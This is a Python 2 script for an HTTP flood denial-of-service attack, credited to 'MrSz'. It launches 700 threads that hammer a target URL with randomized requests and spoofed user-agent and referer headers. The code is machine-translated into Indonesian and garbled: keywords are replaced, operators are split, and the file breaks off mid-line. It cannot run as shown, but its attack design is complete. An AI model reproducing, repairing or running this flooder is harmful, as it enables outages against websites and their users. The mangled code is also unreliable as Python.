# MrSz # - @powered HTTP Flood - Http doser.py

impor urllib
impor sys
impor threading
impor acak
impor ulang

# params global
url = ' '
host = ' '
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
aman = 0

def  inc_counter ():
	request_counter global
	request_counter + = 1

def  set_flag ( val ):
	bendera global
	flag = val

def  set_safe ():
	aman global
	aman = 1
	
# menghasilkan array agen pengguna
def  useragent_list ():
	global headers_useragents
	headers_useragents.append ( ' Mozilla / 5.0 (X11; U; Linux x86_64; en-US; rv: 1.9.1.3) Gecko / 20090913 Firefox / 3.5.3 ' )
	headers_useragents.append ( ' Mozilla / 5.0 (Windows; U; Windows NT 6.1; en; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729) ' )
	headers_useragents.append ( ' Mozilla / 5.0 (Windows; U; Windows NT 5.2; en-US; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729) ' )
	headers_useragents.append ( ' Mozilla / 5.0 (Windows; U; Windows NT 6.1; en-US; rv: 1.9.1.1) Gecko / 20090718 Firefox / 3.5.1 ' )
	headers_useragents.append ( ' Mozilla / 5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit / 532.1 (KHTML, seperti Gecko) Chrome / 4.0.219.6 Safari / 532.1 ' )
	headers_useragents.append ( ' Mozilla / 4.0 (kompatibel; MSIE 8.0; Windows NT 6.1; WOW64; Trident / 4.0; SLCC2;. NET CLR 2.0.50727; InfoPath.2) ' )
	headers_useragents.append ( ' Mozilla / 4.0 (kompatibel; MSIE 8.0; Windows NT 6.0; Trident / 4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0. 30729) ' )
	headers_useragents.append ( ' Mozilla / 4.0 (kompatibel; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident / 4.0) ' )
	headers_useragents.append ( ' Mozilla / 4.0 (kompatibel; MSIE 8.0; Windows NT 5.1; Trident / 4.0; SV1; .NET CLR 2.0.50727; InfoPath.2) ' )
	headers_useragents.append ( ' Mozilla / 5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US) ' )
	headers_useragents.append ( ' Mozilla / 4.0 (kompatibel; MSIE 6.1; Windows XP) ' )
	headers_useragents.append ( ' Opera / 9.80 (Windows NT 5.2; U; ru) Presto / 2.5.22 Versi / 10.51 ' )
	return (headers_useragents)

# menghasilkan array referer
def  referer_list ():
	headers_referers global
	headers_referers.append ( ' http://www.google.com/?q= ' )
	headers_referers.append ( ' http://www.usatoday.com/search/results?q= ' )
	headers_referers.append ( ' http://engadget.search.aol.com/search?q= ' )
	headers_referers.append ( ' http: // '  + host +  ' / ' )
	return (headers_referers)
	
# membangun string ascii acak
def  buildblock ( ukuran ):
	out_str =  ' '
	untuk saya dalam  kisaran ( 0 , ukuran):
		a = random.randint ( 65 , 160 )
		out_str + =  chr (a)
	return (out_str)

 penggunaan def ():
	cetak ( '' '  \ 033 [96m	
================================================== ===
  ____ _____ _____ _____ ___ _____
/ \ / | \ | \ / \ |
| ______ | / | \ | \ | | | ____
| | >>>> | | | | | | | |
| | \ | / | / | | |
| | \ _____ | _____ / | _____ / \ ___ / _____ |
================================================== === 
| Versi: V.1 |
| Tim: chaos computer club |
| Buat: MrSz |
############################# n 
	penggunaan: python2 AirCrackDdos.py (http.target.xxx)
	================================================= \ 033 [91m '' ' )
	sys.exit ()

	
# permintaan http
def  httpcall ( url ):
	useragent_list ()
	referer_list ()
	kode = 0
	jika url.count ( " ? " ) > 0 :
		param_joiner = " & "
	lain :
		param_joiner = " ? "
	request = urllib2.Request (url + param_joiner + buildblock (random.randint ( 3 , 10 )) +  ' = '  + buildblock (random.randint ( 3 , 10 ))))
	request.add_header ( ' User-Agent ' , random.choice (headers_useragents))
	request.add_header ( ' Cache-Control ' , ' no-cache ' )
	request.add_header ( ' Terima-Charset ' , ' ISO-8859-1, utf-8; q = 0,7, *; q = 0,7 ' )
	request.add_header ( ' Referer ' , random.choice (headers_referers) + buildblock (random.randint ( 50 , 100 )))
	request.add_header ( ' Keep-Alive ' , random.randint ( 110 , 160 ))
	request.add_header ( ' Koneksi ' , ' tetap hidup ' )
	request.add_header ( ' Host ' , host)
	mencoba :
			urllib2.urlopen (permintaan)
	kecuali urllib2.HTTPError, e:
			# print e.code
			set_flag ( 1 )
			print ( '' ' \ 033 [96m (HTTP) Situs web penyerang -Kirim paket -proxy \ 033 [0m ' '' ))
			kode = 500
	kecuali urllib2.URLError, e:
			# print e.reason
			sys.exit ()
	lain :
			inc_counter ()
			urllib2.urlopen (permintaan)
	kembali (kode)		

	
# http pemanggil utas
kelas  HTTPThread ( threading . Thread ):
	def  run ( mandiri ):
		coba :
			sementara bendera < 2 :
				code = httpcall (url)
				if (code == 500 ) & (safe == 1 ):
					set_flag ( 2 )
		kecuali  Pengecualian , mis:
			lulus

# memantau utas http dan menghitung permintaan
kelas  MonitorThread ( threading . Thread ):
	def  run ( mandiri ):
		sebelumnya = request_counter
		sementara flag == 0 :
			if (sebelumnya + 150 < request_counter) & (sebelumnya <> request_counter):
				cetak  " % d Koneksi - waktu habis "  % (request_counter)
				sebelumnya = request_counter
		jika flag == 2 :
			print  " \ n - Koneksi - habis - "

# jalankan
if  len (sys.argv) <  2 :
	pemakaian()
	sys.exit ()
lain :
	if sys.argv [ 1 ] == " help " :
		pemakaian)
		sys.exit ()
	lain :
		cetak  " Situs penyerang mulai ... menunggu !!! "
		if  len (sys.argv) ==  3 :
			if sys.argv [ 2 ] == " safe " :
				set_safe ()
		url = sys.argv [ 1 ]
		jika url.count ( " / " ) == 2 :
			url = url +  " / "
		m = penelitian ulang ( ' http \: // ([^ /] *) /?.* ' , url)
		host = m.group ( 1 )
		untuk saya dalam  kisaran ( 700 ):
			t = HTTPThread ()
			t.start ()
		t = MonitorThread ()
		t.start (
